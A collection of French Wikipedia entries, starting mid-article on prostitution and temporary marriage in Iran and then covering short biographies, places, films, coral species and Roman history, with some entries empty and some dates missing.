Avant la révolution islamique en 1979, les prostituées étaient confinées dans des quartiers isolés comme Shahr-e No à Téhéran. Le nouveau gouvernement religieux a démoli le district et puni la prostitution de flagellation Tenir un bordel est également un acte criminel, passible d'un à dix ans d'emprisonnement..
Évaluations des États-Unis.
En 2007, le Département d'État des États-Unis a placé l’Iran en "Tier 2" dans son rapport annuel sur le trafic d'êtres humains, affirmant qu'« il ne respecte pas pleinement les standards minimaux pour l’élimination du trafic mais fait des efforts significatifs en ce sens ». En 2010, la Secrétaire d'État des États-Unis Hillary Rodham Clinton a déclassé l’Iran en "Tier 3", notant que le pays ne fait pas d’effort significatif pour résoudre les problèmes de trafic, principalement en relation avec la prostitution et le travail forcé.
Scandale lié à la prostitution.
En 2008, le Général Reza Zarei, le chef de la police de Téhéran, a été arrêté dans un bordel avec six prostituées. Son arrestation a causé de l’embarras pour le gouvernement du Président Ahmadinejad car Zarei était chargé du vice à Téhéran. Le procureur chargé du dossier a noté que Zarei utilisait son bureau à des fins matérielles de prostitution.
Nikah mut‘ah ou Sigheh.
Tandis que la prostitution est illégale en Iran, l’institution chiite du Mut'a (mariage temporaire, communément appelé "Sigheh" en Iran) autorise les relations contractuelles à court terme entre les deux sexes. Habituellement, une dot est offerte à l’épouse temporaire. Le Sigheh peut durer de 15 minutes à 99 ans ; il expire automatiquement sans divorce. Selon certains spécialistes et certains Iraniens, le Sigheh est détourné en couverture légale pour la prostitution en Iran.

</doc>
<doc id="9623314" url="https://fr.wikipedia.org/wiki?curid=9623314" title="Peppa Pig-La Nouvelle Maison">
Peppa Pig-La Nouvelle Maison



</doc>
<doc id="9623322" url="https://fr.wikipedia.org/wiki?curid=9623322" title="Abdul Majid Hassan">
Abdul Majid Hassan

Abdul Majid Hassan est le deuxième sultan de Brunei. Il règne de 1402 à sa mort en 1408 à Nankin.

</doc>
<doc id="9623324" url="https://fr.wikipedia.org/wiki?curid=9623324" title="PT Bivott">
PT Bivott

PT Bivott est un personnage de la série de romans "Henderson's Boys" de Robert Muchamore.

</doc>
<doc id="9623326" url="https://fr.wikipedia.org/wiki?curid=9623326" title="Frédéric-Guillaume de Hohenlohe-Kirchberg">
Frédéric-Guillaume de Hohenlohe-Kirchberg

Le prince Frédéric-Guillaume de Hohenlohe-Kirchberg, né le à Kirchberg, situé sur le domaine de la maison Hohenlohe, et mort le à Prague, est un officier général autrichien au service de la monarchie des Habsbourg. Il est issu d'une ancienne famille comtale de Hohenlohe, devenue princière par la suite, qui possède de vastes propriétés au sud du fleuve Main, entre la cité impériale de Schwäbisch Hall et la ville de Rothenburg ob der Tauber. 
Il sert dans l'armée autrichienne au cours de la guerre de Sept Ans, de la guerre de Succession de Bavière et des guerres de la Révolution française. En sa qualité de général aguerri et expérimenté, il est choisi pour être le mentor du jeune archiduc Charles, qui est affecté à son état-major durant la campagne de France en 1792. De 1780 jusqu'à sa mort, il est également propriétaire d'un régiment d'infanterie autrichien.
Biographie.
Jeunesse et début de carrière.
Il est le premier fils du prince Karl August de Hohenlohe-Gleichen et de sa deuxième épouse, Susanne Margarete Luise von Auersperg. Par la suite, sa mère a encore huit enfants jusqu'à son décès le 12 septembre 1748. Son père se remarie le 21 janvier 1749 et a quatre autres enfants.
La carrière militaire de Hohenlohe-Kirchberg commence en 1756 lorsqu'il entre au régiment d'infanterie autrichien "Braunschweig-Wolfenbüttel". Capitaine de grenadiers au début de la guerre de Sept Ans, il est blessé à deux reprises, d'abord à la bataille de Leuthen puis à celle de Landshut, où il s'empare de trois redoutes prussiennes. Pour cet exploit, il est fait chevalier de l'ordre militaire de Marie-Thérèse le 22 décembre 1761, et est successivement promu aux grades de major en 1758, lieutenant-colonel en 1761 et colonel en 1764.
Il sert ensuite sous les ordres du maréchal Laudon pendant la courte guerre de Succession de Bavière, aussi appelée la « guerre des Patates » en raison de la rareté des engagements et des quantités de vivres prises à l'ennemi. À l'issue du conflit, le prince est nommé propriétaire du régiment d'infanterie en 1780 (charge qu'il conserve jusqu'à sa mort en 1796) et "Feldmarschall-Leutnant" deux ans plus tard. En 1787, il participe à la guerre austro-turque et est une nouvelle fois affecté auprès de Laudon en tant que divisionnaire. Il remporte une victoire sur les Ottomans à Persenji les 7 et 8 octobre 1789, ce qui lui vaut la croix de commandeur de Marie-Thérèse. Élevé au grade de "Feldzeugmeister" le 15 octobre 1789, il devient gouverneur militaire de la Transylvanie.
Parcours lors des guerres révolutionnaires.
En 1792, il commande initialement les soldats autrichiens placés dans la vallée du Haut-Rhin. Au mois d'août, ses troupes traversent le Rhin à Mannheim et participent au siège de Thionville début septembre. Simultanément, les Alliés s'emparent sans grande difficulté de la forteresse de Longwy le 23 août et progressent lentement sur Verdun, dont la prise se révèle encore plus aisée. Le duc de Brunswick décide alors de marcher sur Paris et s'approche des défilés de l'Argonne. Il prend soin de détacher sur sa gauche hommes qui, en liaison avec l'armée des Princes et un contingent hessois, doivent couvrir l'avance prussienne en direction de Valmy.
Militaire issu de la vieille école mais expérimenté et aguerri, Hohenlohe est choisi pour être le mentor du jeune archiduc Charles qui fait la campagne à ses côtés ; absents du champ de bataille de Valmy, les deux hommes sont néanmoins suffisamment proches pour entendre les bruits de la canonnade. Alors que l'armée du duc de Brunswick est confrontée à l'aile nord du dispositif français (désignée sous le nom d'« armée de Sedan »), le prince de Hohenlohe-Kirchberg fait face au flanc sud (« armée de Metz »). Au cours du mois de décembre 1792, ses troupes défendent avec succès la ville de Trèves face à l'armée de Moselle du général Beurnonville, qui est relevé de son commandement à la suite de cet échec. Le dernier jour de décembre, le prince est fait grand-croix de l'ordre de Marie-Thérèse en récompense de sa victoire.
En mai 1793, il joue un rôle important dans la victoire des Alliés lors de la bataille de Famars. Il succède ensuite au général Mack au poste de chef d'état-major de la principale armée coalisée en Flandre. Sous les ordres du prince de Saxe-Cobourg, il décide de la défaite française à Avesnes-le-Sec le 12 septembre avant de prendre le commandement d'un corps sur le Haut-Rhin avec lequel il parvient à reconquérir Spire en septembre 1794. C'est là son dernier fait d'armes : retiré pour raison de santé au début de l'année 1795, il meurt à Prague d'un accès de fièvre le 10 août 1796.
Hohenlohe-Kirchberg est un officier d'expérience dont la longue carrière militaire a fait l'un des représentants de la vieille école de guerre. Chef perspicace et réfléchi, il est doté de grandes capacités de manœuvrier et ne laisse rien au hasard dans la conduite d'une bataille. Son sang-froid et sa détermination se doublent de qualités humaines qui font dire à l'archiduc Charles, son « élève », qu'il est .
Famille.
Frédéric-Guillaume se marie en 1770 avec la comtesse Friederike de Reuss zu Greiz (1750-1816), mais le couple n'a pas d'enfants. Sept de ses douze frères et sœurs meurent avant l'âge de 10 ans. Les cinq enfants survivants sont, dans l'ordre chronologique :

</doc>
<doc id="9623329" url="https://fr.wikipedia.org/wiki?curid=9623329" title="Pedro Pony">
Pedro Pony



</doc>
<doc id="9623359" url="https://fr.wikipedia.org/wiki?curid=9623359" title="Migueláñez">
Migueláñez

Migueláñez est une commune de la province de Ségovie dans la communauté autonome de Castille-et-León en Espagne.

</doc>
<doc id="9623361" url="https://fr.wikipedia.org/wiki?curid=9623361" title="Jérôme Ludvaune">
Jérôme Ludvaune

Jérôme Ludvaune, né le , est un homme politique vanuatais. 
Enseignant en école primaire de 1990 à 2008, il est ensuite conseiller pour l'élaboration des programmes scolaires sur l'île de Malekula jusqu'en 2012. Cette année-là, il entre en politique, et est élu député de Malekula au Parlement, représentant l'Union des partis modérés (UPM). Le , il est nommé ministre du Changement climatique, de l'Environnement et de l'Énergie dans le gouvernement du premier ministre Sato Kilman ; il succède à Thomas Laken, qui vient d'être condamné à trois ans de prison pour corruption. Dans le cadre de cette nouvelle fonction, il participe à la Conférence de Paris de 2015 sur le climat en .
L'UPM est reléguée sur les bancs de l'opposition parlementaire à l'issue des élections législatives de janvier 2016. En novembre de cette même année, toutefois, le Premier ministre Charlot Salwai nomme Jérôme Ludvaune ministre de la Santé dans son gouvernement. En décembre 2017, Ludvaune accepte de démissionner du gouvernement afin que le Premier ministre puisse offrir son ministère à Gracia Shadrack, du Parti des dirigeants, ayant besoin du soutien de ce dernier. Jérôme Ludvaune perd son siège de député aux élections de mars 2020.

</doc>
<doc id="9623365" url="https://fr.wikipedia.org/wiki?curid=9623365" title="Jérôme Ludvaume">
Jérôme Ludvaume



</doc>
<doc id="9623367" url="https://fr.wikipedia.org/wiki?curid=9623367" title="Rue Marx-Dormoy (Reims)">
Rue Marx-Dormoy (Reims)

La rue Marx-Dormoy est une voie de la commune de Reims, située au sein du département de la Marne, en région Grand Est.
Situation et accès.
La rue de Vesle appartient administrativement au quartier centre-ville de Reims et permet de joindre la place d'Erlon avec la rue de Vesle. C'est une rue commerçante piétonne du centre ville.
Origine du nom.
Elle fait référence à Marx Dormoy, ministre du Front populaire.
Historique.
Dénommée « rue des Tranchées » en 1840 elle prend le nom de « rue Saint-Jacques », avant de prendre sa dénomination actuelle en 1946.

</doc>
<doc id="9623368" url="https://fr.wikipedia.org/wiki?curid=9623368" title="Lebourgneuf">
Lebourgneuf



</doc>
<doc id="9623385" url="https://fr.wikipedia.org/wiki?curid=9623385" title="RNTBCI">
RNTBCI



</doc>
<doc id="9623387" url="https://fr.wikipedia.org/wiki?curid=9623387" title="Lionel Olivier">
Lionel Olivier

Lionel Olivier, né le à Bertry (Nord), est un écrivain français, auteur de roman policier.
Biographie.
Avant d’écrire, Lionel Olivier a été commandant de police à l'emploi fonctionnel.

</doc>
<doc id="9623391" url="https://fr.wikipedia.org/wiki?curid=9623391" title="Fletcher Markle">
Fletcher Markle

Fletcher Markle (né le , mort le ) est un acteur et réalisateur canadien, producteur de télévision et scénariste.
Il a commencé sa carrière à la radio au Canada, avant de devenir réalisateur et producteur de cinéma et de télévision.

</doc>
<doc id="9623393" url="https://fr.wikipedia.org/wiki?curid=9623393" title="Markus Hännikäinen">
Markus Hännikäinen

Markus Mikael Hännikäinen (né le à Helsinki) est un joueur professionnel finlandais de hockey sur glace. Il évolue au poste d'attaquant.
Biographie.
Carrière en club.
Formé au Kiekko-Tiikerit, il rejoint les équipes de jeunes du Jokerit Helsinki. En 2011-2012, il débute en senior avec l'équipe première dans la SM-liiga.
En 2015, il signe un contrat de deux ans avec les Blue Jackets de Columbus. Il part alors en Amérique du Nord et est assigné aux Monsters du lac Érié, club ferme des Blue Jackets dans la Ligue américaine de hockey.
Le , il joue son premier match dans la Ligue nationale de hockey face aux Blues de Saint-Louis au cours duquel il se blesse à l'épaule.
Il remporte la Coupe Calder 2016 avec les Monsters du lac Érié.
Le , il est échangé aux Coyotes de l'Arizona en retour d'un choix conditionnel de tour en 2020.
Carrière en équipe nationale.
Il représente la Finlande en sélections jeunes.

</doc>
<doc id="9623397" url="https://fr.wikipedia.org/wiki?curid=9623397" title="Musées d'art régionaux de la Finlande">
Musées d'art régionaux de la Finlande

Les Musées d'art régionaux de la Finlande () sont des musées d'art régionaux en Finlande.
Fonction.
Leurs responsabilités sont la recherche, la conservation et l'exposition d'œuvres.
Le Ministère de l'Éducation et de la Culture a désigné en 1980 les 16 musées régionaux.

</doc>
<doc id="9623399" url="https://fr.wikipedia.org/wiki?curid=9623399" title="Moret Loing et Orvanne">
Moret Loing et Orvanne



</doc>
<doc id="9623401" url="https://fr.wikipedia.org/wiki?curid=9623401" title="Ramanathan">
Ramanathan



</doc>
<doc id="9623402" url="https://fr.wikipedia.org/wiki?curid=9623402" title="Michael Tollin">
Michael Tollin

Michael Tollin, né le à Philadelphie, est un producteur et réalisateur américain. Il a travaillé à des œuvres telles "Radio", "Coach Carter" et "Varsity Blues". Il a créé et produit des émissions telles "All That", "The Amanda Show", "Kenan et Kel", "Les Frères Scott", "Smallville", "Ce que j'aime chez toi", "The Bronx Is Burning" et "". 
Jeunesse et formation.
Michael Tollin grandit à , en banlieue de Philadelphie. Son père, Sol Tollin (1929–2006), a joué au basketball et au baseball pour le "Haverford College" de 1947-1951. Tollin développe une passion pour les sports dès son enfance.
Tollin et son père ont été intégrés au "Philadelphia Jewish Sports Hall of Fame" en 2009.
Michael Tollin obtient un diplôme de la "" et, en 1977, de l'Université Stanford, où il est chroniqueur et animateur sportif pour l'équipe de basketball.
Carrière.
Après Stanford, Tollin est producteur/scénariste de "", une série de documentaires sportifs.
Il déménage à New York afin de travailler avec MLB Productions. Il est l'un des créateurs de la série "The Baseball Bunch", gagnante d'un "Emmy Award".
En 1980, il scénarise un film sur la série mondiale de baseball où son équipe favorite, les Phillies de Philadelphie, défont les Royals de Kansas City en six parties. Son scénario est narré par Vin Scully.
En 1982, Tollin lance la compagnie "Halcyon Days Productions" et obtient les droits exclusifs de l"'United States Football League" (USFL). En plus de l'USFL, "Halcyon Days Productions" produit des documentaires sportifs et des émissions de télévision pour enfants.
Après la chute de l'USFL en 1985, Tollin déménage en Californie et fonde, avec Brian Robbins, la compagnie "".
En 1993, Tollin et Robbins produisent "Hardwood Dreams", gagnant du "Crystal Heart award" au festival du film de Heartland de 1993.
Les 15 années suivantes, Tollin et Robbins produisent et réalisent une douzaine de films dont "Varsity Blues", "Coach Carter", "Radio", "Dreamer", "Bande de sauvages" et "Hardball" ainsi que des séries télévisées telles "Smallville", "Arliss" et "Les Frères Scott" et des documentaires tels "".
En 2007, Robbins et Tollin se séparent à l'amiable afin de réaliser chacun leurs projets.
En 2012, Tollin s'associe à Peter Guber, pdg de "Mandalay Entertainment", pour former "Mandalay Sports Media" (MSM).

</doc>
<doc id="9623404" url="https://fr.wikipedia.org/wiki?curid=9623404" title="Pdg">
Pdg



</doc>
<doc id="9623410" url="https://fr.wikipedia.org/wiki?curid=9623410" title="Placotrochus candeanus">
Placotrochus candeanus

Placotrochus candeanus est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9623416" url="https://fr.wikipedia.org/wiki?curid=9623416" title="Rauno Alliku">
Rauno Alliku

Rauno Alliku, né le à Pärnu en Estonie, est un footballeur international estonien, qui évolue au poste d'attaquant.
Biographie.
Carrière de joueur.
Rauno Alliku dispute quatre matchs en Ligue des champions, et six matchs en Ligue Europa.
Carrière internationale.
Rauno Alliku compte huit sélections avec l'équipe d'Estonie depuis 2010. 
Il est convoqué pour la première fois par le sélectionneur national Tarmo Rüütli pour un match amical contre la Chine le (défaite 3-0).

</doc>
<doc id="9623417" url="https://fr.wikipedia.org/wiki?curid=9623417" title="L'Ange de la haine">
L'Ange de la haine

L'Ange de la haine (titre original : ") est un film américain réalisé par Fletcher Markle et sorti en 1949.
Synopsis.
L'histoire commence par la mort du propriétaire d'une imprimerie qui est rapidement considéré comme un suicide. Mais le chroniqueur Charlie Riggs est convaincu qu'il s'agit d'un meurtre lié à une organisation néofasciste blanche appelée les Crusaders et transmet ce soupçon à l'assistant du procureur Howard Malloy et publie cette opinion dans sa chronique. Plus tard, Riggs est lui-même assassiné, ce qui incite Malloy à lancer une enquête sur les Crusaders mais comme ce groupe semble bénéficier du soutien du crime organisé, Malloy s'y intéresse et reçoit bientôt l'aide non sollicitée d'un patron du crime appelé Angel, qui le recommande pour le poste de procureur spécial.
Avec l'aide de la veuve d'un juge éminent, Malloy est nommé, ce qui est censé le mettre dans la poche de ceux qui sont derrière les meurtres. Mais Malloy enquête sur l'artiste qui a créé l'affiche de recrutement des Crusaders et voyant dans l'atelier de l'artiste la peinture d'une séduisante chanteuse de night-club, Malloy entreprend d'enquêter sur elle.
Cela le conduit à une série de révélations concernant tous ces personnages et se termine par de nouveaux morts et blessés dans un échange ardent à la fin.

</doc>
<doc id="9623418" url="https://fr.wikipedia.org/wiki?curid=9623418" title="Jigsaw (film, 1949)">
Jigsaw (film, 1949)



</doc>
<doc id="9623424" url="https://fr.wikipedia.org/wiki?curid=9623424" title="Placotrochus laevis">
Placotrochus laevis

Placotrochus laevis est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9623427" url="https://fr.wikipedia.org/wiki?curid=9623427" title="Nicolas Audet">
Nicolas Audet

Nicolas Audet (1481-1562) est un carme, originaire de l'île de Chypre, prieur général et réformateur de sa famille religieuse, à l'époque de la Renaissance.
Biographie.
Un général réformateur.
Nicolas Audet est né en 1481 à Chypre, dans une famille d'ascendance française. Entré chez les carmes, il s'y fait remarquer par la puissance de sa personnalité, alliant ténacité, prudence et bonté. Aussi le pape Adrien VI (un Hollandais au tempérament réformateur) le nomme-t-il, en 1523, vicaire général de l'Ordre, sous le généralat de Bernardino Landucci. Certain d'être élu à la tête de sa famille religieuse au prochain chapitre de l'Ordre, Nicolas établit aussitôt son programme de réforme et publie un ouvrage, l"'Isagogicon", dans lequel il dénonce les manquements de ses confrères, tout en suggérant des moyens pour y remédier. Une fois élu, le , au chapitre général de Venise, il s'empresse de faire approuver par ce dernier les nouvelles constitutions qu'il vient de mettre au point, sur base de ses propres travaux et des textes législatifs du réformateur Jean Soreth. Les décrets pris à ce moment-là se verront encore explicités et renforcés aux chapitres généraux suivants, en 1532, 1539 et 1548. Pour mener à bien sa réforme, Nicolas visite les couvents de chaque province ou y envoie des délégués, parmi lesquels Egidio Riccardi. C'est ainsi que, dans un rapport rédigé entre 1550 et 1557, il peut annoncer que, sur quatre-vingts provinces, cinq ont été totalement ramenées à la stricte observance : Allemagne inférieure, France, Narbonne, Castille et Portugal.
Face à de multiples problèmes.
Une telle œuvre ne s'est pas accomplie sans difficultés : de nombreux carmes ont préféré quitter le cloître plutôt que de changer leurs habitudes de vie, particulièrement en Castille. Il faut dire que, dès le commencement de son généralat, Nicolas avait rencontré des résistances. D'une part, à la mort de Landucci, le provincial de Narbonne, Étienne Joannesius, s'était permis de convoquer un chapitre à Montpellier, où il s'était fait élire prieur général de l'Ordre à la place d'Audet. D'autre part, la congrégation de Mantoue refusant de reconnaître un droit de visite au général, il s'en était suivi, de 1533 à 1539, un procès, au terme duquel le tribunal de la Rote avait tranché en faveur de Nicolas, tout en restreignant, cependant, les droits de ce dernier. La plus grande épreuve de son généralat a toutefois consisté dans la perte des cent vingt couvents situés dans les six provinces détruites par le protestantisme et l'anglicanisme. Nicolas avait, pour sa part, opté en faveur d'une réforme à l'intérieur du catholicisme. Dans cette perspective, il a fait pression sur les papes pour que ceux-ci réforment une Curie romaine trop empressée à vendre aux religieux dispenses et bénéfices, ce qui avait pour résultat de réduire à néant les efforts des réformateurs. À partir de 1554, il a également participé activement aux sessions du concile de Trente, avant de décéder, aux premiers jours de , après quarante ans à la tête de l'Ordre.
Postérité.
À travers les nouvelles constitutions, Nicolas entendait mettre l'accent sur l'observance de la pauvreté, de la vie commune et de la clôture. Il cherchait également à réorganiser la formation et les études, en veillant à un meilleur discernement dans le choix des candidats à la vie carmélitaine. Fidèle à la vocation contemplative du Carmel, il insistait sur la célébration de la liturgie selon le rite propre à l'Ordre. À cet effet, il a publié, en 1544, une version corrigée de l"'Ordinale" de Sibert de Béka, avant de s'employer à des travaux d'édition du missel et du bréviaire de l'Ordre. Les constitutions d'Audet seront reprises et mises en conformité avec les décrets du Concile de Trente, par le prieur général suivant, Jean-Baptiste Rossi (dit "Rubeo"), nommé le par Pie IV. C'est ce même Rubeo qui, de passage à Avila, le , approuvera l'œuvre réformatrice de Thérèse de Jésus, commencée sous le généralat de son prédécesseur.

</doc>
<doc id="9623442" url="https://fr.wikipedia.org/wiki?curid=9623442" title="Placotrochus pedicellatus">
Placotrochus pedicellatus

Placotrochus pedicellatus est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9623457" url="https://fr.wikipedia.org/wiki?curid=9623457" title="Moderaterna på Åland">
Moderaterna på Åland



</doc>
<doc id="9623458" url="https://fr.wikipedia.org/wiki?curid=9623458" title="Another Setting">
Another Setting

Another Setting est le troisième album studio du groupe anglais : The Durutti Column, sorti en .
Liste des titres.
Tous les titres écrits par Vini Reilly.
Édition vinyle de 1983 :
Réédition CD de 2015 par Factory Benelux (FBN-30-CD):

</doc>
<doc id="9623459" url="https://fr.wikipedia.org/wiki?curid=9623459" title="René Chudeau">
René Chudeau

René Chudeau (Angers, - Paris, ) est un géologue et explorateur français.
Biographie.
René Charles Marie Chudeau est le fils de René Arthur Chudeau, négociant manufacturier, et de Marie Caroline Louise Aubert. Il étudie la géologie à l'École normale supérieure (1884-1887), obtient l'agrégation de sciences naturelles en 1888, puis, à partir de 1890 devient professeur à l'Université de Besançon. Docteur ès-sciences (1896), sa thèse porte sur la Vieille-Castille.
En 1900, il entre à l'Université d'Alger. Émile-Félix Gautier l'engage alors, en 1904, dans une expédition au Sahara. Après avoir atteint Timimoun dans le Gourara, il gagne l'Adrar où il rejoint Gautier (). Étudiant la possibilité d'un tracé de ligne télégraphique entre In Salah et Tombouctou, Chudeau et Gautier se joignent à la mission Dinaux.
La mission passe à In Zize et Timissao et atteint l'Adrar des Ifoghas. Gautier la quitte à Bou Ghassa pour joindre le Niger et l'Algérie par la vallée du Tilemsi, tandis que Chudeau et Dinaux visitent l'Aïr (). Après avoir atteint Iférouane, Dinaux décide d'abandonner.
Seul, Chudeau atteint Agadès puis Zinder et le Tchad () et rentre en France par le Niger et le Sénégal après avoir relevé six mille sept cents kilomètres de trajets et ramené de nombreux renseignements scientifiques. Il apprend alors qu'il est révoqué par le recteur d'Alger, pour absence injustifiée.
Entré au Ministère des Colonies, il visite la Mauritanie avec Abel Gruvel (1908) et y retourne seul, sans escorte et sans bagage de 1910 à 1912.
Géologue de la mission Nieger (1912), il étudie le tracé d'un chemin de fer transafricain entre l'Algérie et le Tchad. Il visite alors tout le Hoggar central et occidental, parcourt le Ténéré jusqu'à In Guezzam et atteint Ansongo sur le Niger par la vallée morte de l'oued Tafassasset.
De retour à Tombouctou en 1913, il suit la caravane du sel jusqu'à Taoudeni. De retour en France, il devient attaché au Muséum de Paris.
Il meurt dans la misère d'un accès de paludisme après la Première Guerre mondiale laissant une œuvre considérable sur le Sahara consacré à sa géologie, sa botanique, sa zoologie et son ethnographie. Il a aussi établi une des toutes premières cartes géologiques du Sahara.
Œuvres.
Outre de nombreux articles, on lui doit :
Hommage.
"Pennisetum chudeaui", "Acomys chudeaui" et le "Sclerophrys chudeaui" ont été nommés en son honneur.

</doc>
<doc id="9623464" url="https://fr.wikipedia.org/wiki?curid=9623464" title="Débat sur l'exécution des partisans de Catilina">
Débat sur l'exécution des partisans de Catilina

Le 5 décembre 63 av. J.-C., en pleine conjuration de Catilina, le Sénat romain débat du sort de cinq conjurés. Ce débat est devenu une référence rhétorique et politique, puisqu'il est notamment l'un des premiers connus à aborder le thème de la peine de mort, mais aussi le droit extraordinaire. Il nous est rapporté notamment par Salluste.
Contexte.
Cicéron s'est vu remettre, avec Hybrida, les pleins pouvoirs par l'ordonnance de "senatus consultum ultimum" plus tôt dans l'année. La jugulation de la crise le rend très populaire.
Statilius, Aulus Gabinius, Ceparius, Cethegus et Lentulus ont été arrêtés le 3 décembre pour leur participation à la conjuration.
Les discours mémorables.
Le discours de Cicéron.
Deux jours après avoir prononcé sa "Troisième Catilinaire" et avoir démasqué cinq conjurés restés dans Rome, Cicéron interroge quant à leur sort dans la "Quatrième" au temple de la Concorde. Bien qu'il n'ait formellement pas le droit d'exprimer une opinion puisqu'il exerce la charge de consul, il contourne cet interdit par une subtile rhétorique, appelant à la condamnation à mort des conjurés.
Le discours de César.
Au Sénat, Silanus s'exprime en premier parmi les sénateurs, et il réclame la mort pour les conjurés. Tous les sénateurs qui prennent la parole ensuite expriment la même opinion, jusqu'à César. Celui-ci est dans une position difficile, puisque dans le même camp politique que Catilina, bien qu'il n'ait probablement pas participé à la conjuration. Il se prononce contre l'exécution des conjurés, prétextant le risque de colère populaire et appelle à respecter le droit romain, qui promet un procès équitable à tous les citoyens et ne permet pas leur exécution. Dans son discours plein d'humanité, il appelle donc à l'emprisonnement.
En tant que personnalité politique montante, et du fait de ses opinions contraires, il s'érige directement contre Cicéron en l'accusant de vouloir profiter de la situation pour servir ses fins politiques. De fait, Cicéron serait ensuite plébiscité pour sa gestion de la crise, et distingué "pater patriæ". La rhétorique de César est tellement efficace qu'il parvient à retourner l'opinion du Sénat, y compris celle de Silanus.
Le discours de Caton.
Caton accuse ensuite César de tenter de mettre le Sénat sous pression populaire pour adoucir la peine des conjurés et lui-même déstabiliser le Sénat. Le stoïcien tient ce discours :
L'affrontement entre César et Caton prend ensuite un tour philosophique et ils débattent de la souffrance.
Issue.
Caton, dont la rhétorique n'a rien à envier à celle de César, sort victorieux du vote. Les conjurés sont exécutés par étranglement au Tullianum, à l’issue de la séance. À l'extérieur de Rome, la conjuration ne tarde pas à être vaincue, et Cicéron en tire, dans un premier temps, un grand prestige. César favorise l'agitation populaire pour déstabiliser un peu plus le Sénat et ses adversaires victorieux.

</doc>
<doc id="9623465" url="https://fr.wikipedia.org/wiki?curid=9623465" title="Téteghem-Coudekerque-Village">
Téteghem-Coudekerque-Village

Téteghem-Coudekerque-Village est, depuis le , une commune nouvelle française située dans le Nord en région Hauts-de-France. Elle est issue du regroupement des deux communes de Coudekerque-Village et Téteghem.
Géographie.
Localisation.
Le territoire de la commune est limitrophe de ceux de 9 communes :
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le canal Nieuport-Dunkerque, le canal de Bergues, le canal des Moeres, le Langhegracht, la Duneleet, le Zeegracht, le canal de Coudekerque, le canal des Chats, le Petit Heyleet, la branche du canal de coudekerque, la Quaeke Beke, le canal de Coudekerque, le stinkaert, le watergang de la Chapelle, le watergang Leedyck, le watergang Niderleet, le watergang Snackedyck et divers autres petits cours d'eau.
Le canal Nieuport-Dunkerque est un canal, chenal et un cours d'eau naturel qui relie Furnes, en Belgique, à Dunkerque.
Le canal des Moeres, d'une longueur de , prend sa source dans la commune de Warhem et se jette dans le canal Nieuport-Dunkerque à Dunkerque, après avoir traversé .
La Langhegracht, d'une longueur de , prend sa source dans la commune de Looberghe et se jette dans le Canal de Bergues sur la commune, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Delta de l'Aa ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Aa. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est l'Institution intercommunale des Wateringues.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique altéré, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Côtes de la Manche orientale, caractérisée par un faible ensoleillement () ; forte humidité de l’air (plus de avec humidité relative &gt; 80 % en hiver), vents forts fréquents. Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Dunkerque à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Téteghem-Coudekerque-Village est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Téteghem-Coudekerque-Village, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Dunkerque, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Voies de communication et transports.
Téteghem-Coudekerque-Village est desservie par les lignes C6, 18 et 24 du réseau DK'BUS.
Histoire.
La commune nouvelle a été créée le janvier 2016, entraînant la transformation des deux anciennes communes en « communes déléguées » dont la création a été entérinée par l'arrêté du 30 novembre 2015.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement âgée. En 2021, le taux de personnes d'un âge inférieur à s'élève à 29,1 %, soit un taux inférieur à la moyenne départementale (39 %). À l'inverse, le taux de personnes d'un âge supérieur à 60 ans (30,6 %) est supérieur au taux départemental (23,2 %).
En 2021, la commune comptait pour , soit un taux de 51,3 % de femmes, inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit :

</doc>
<doc id="9623466" url="https://fr.wikipedia.org/wiki?curid=9623466" title="Polymyces fragilis">
Polymyces fragilis

Polymyces fragilis est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9623472" url="https://fr.wikipedia.org/wiki?curid=9623472" title="2016 en Océanie">
2016 en Océanie

Cet article concerne les événements thématiques qui se sont produits durant l'année 2016 en Océanie.
Sport.
Articles détaillés :
 Médailles d'or :
Médailles et classement :
Articles détaillés :
Médailles et classement :

</doc>
<doc id="9623473" url="https://fr.wikipedia.org/wiki?curid=9623473" title="Bataille de Ramadi (2015-2016)">
Bataille de Ramadi (2015-2016)

